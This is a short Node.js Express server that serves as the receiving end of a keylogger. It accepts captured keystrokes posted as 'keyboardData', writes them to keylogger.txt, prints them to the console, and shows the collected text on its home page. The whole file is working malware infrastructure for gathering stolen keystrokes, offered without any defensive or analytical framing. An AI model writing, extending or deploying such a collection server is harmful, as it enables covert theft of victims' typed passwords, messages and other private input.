const fs = require("fs");
const bodyParser = require("body-parser");
const express = require("express");
const process = require("process")

const app = express();
let port = 8080;

if ((process.argv[2]) != undefined){
    port = process.argv[2];
}


app.use(bodyParser.json({
        extended: true
    })
);

app.get("/", (req, res) => {
    try{
        const file = fs.readFileSync("./keylogger.txt", {
            encoding: "utf-8",
            flag: "r"
        });

        res.send(`<h1>Available data!</h1><br><p>${file.replace("\n", "<br>")}</p>`);
    }

    catch{
        res.send("<h1>Nothing is there!</h1>")
    }

});

app.post("/", (req, res) => {
    console.log(req.body.keyboardData);

    fs.writeFileSync("./keylogger.txt", req.body.keyboardData);
    res.send("Successfully send data!");
})


app.listen(port, () => {
    console.log(`App is listening on ${port}`)
})


